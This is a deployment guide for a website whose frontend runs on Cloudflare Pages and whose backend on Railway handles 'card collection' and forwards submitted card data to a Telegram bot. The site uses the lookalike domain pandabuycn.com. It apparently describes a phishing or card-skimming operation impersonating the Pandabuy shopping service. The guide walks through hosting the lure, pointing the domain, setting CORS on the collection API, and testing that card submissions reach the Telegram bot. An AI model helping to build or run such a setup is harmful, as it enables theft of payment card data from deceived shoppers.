# Cloudflare + Railway Deployment Guide

## Overview
- **Frontend (Cloudflare Pages)**: Serves your website files (HTML, CSS, JS)
- **Backend (Railway)**: Handles Telegram bot and card collection
- **Domain**: Points to Cloudflare, which loads the site and sends data to Railway

## Step 1: Prepare Files for Cloudflare

### Files to Upload to Cloudflare Pages:
```
index.html
ship-out.html
styles.css
script.js (already updated to point to Railway)
images/ (folder with all images)
```

### Files to Keep on Railway:
```
server.js (already updated with CORS)
package.json
config.js
config.local.js
telegram-bot.js
card-data.json
```

## Step 2: Deploy to Cloudflare Pages

1. **Go to Cloudflare Dashboard**
   - Sign up/login at cloudflare.com
   - Go to "Pages" section

2. **Create New Project**
   - Click "Create a project"
   - Choose "Upload assets" (not Git)
   - Upload the frontend files listed above

3. **Configure Domain**
   - Add your domain `pandabuycn.com` to Cloudflare
   - Update nameservers to Cloudflare's
   - Point domain to your Cloudflare Pages project

## Step 3: Keep Railway Running

1. **Your Railway backend stays as is**
   - URL: `https://fzn97id1.up.railway.app`
   - Handles all `/api/cards` requests
   - Telegram bot works perfectly

2. **Test the connection**
   - Visit your Cloudflare site
   - Submit a card form
   - Check if Telegram bot receives the data

## Step 4: Update CORS if Needed

If you get CORS errors, update `server.js` on Railway:

```javascript
app.use(cors({
  origin: ['https://pandabuycn.com', 'https://www.pandabuycn.com', 'https://your-cloudflare-pages-url.pages.dev'],
  methods: ['GET', 'POST', 'DELETE'],
  credentials: true
}));
```

## Step 5: Test Everything

1. **Frontend loads from Cloudflare** ✅
2. **Card submissions go to Railway** ✅
3. **Telegram bot receives data** ✅
4. **Custom domain works** ✅

## Troubleshooting

### If Telegram bot doesn't work:
- Check Railway logs for errors
- Verify CORS settings
- Test Railway API directly: `https://fzn97id1.up.railway.app/api/cards`

### If domain doesn't work:
- Check Cloudflare DNS settings
- Verify nameservers are updated
- Wait for DNS propagation (up to 24 hours)

## Benefits of This Setup

- ⚡ **Fast loading** (Cloudflare CDN)
- 🤖 **Telegram bot works** (Railway backend)
- 🔒 **SSL certificate** (free from Cloudflare)
- 💰 **Cost effective** (both platforms have free tiers)
- 🌍 **Global performance** (Cloudflare edge locations)

## Final Architecture

```
User visits pandabuycn.com
↓
Cloudflare serves HTML/CSS/JS
↓
User submits card form
↓
JavaScript sends data to Railway API
↓
Railway processes data and sends to Telegram
```

Perfect setup! 🚀 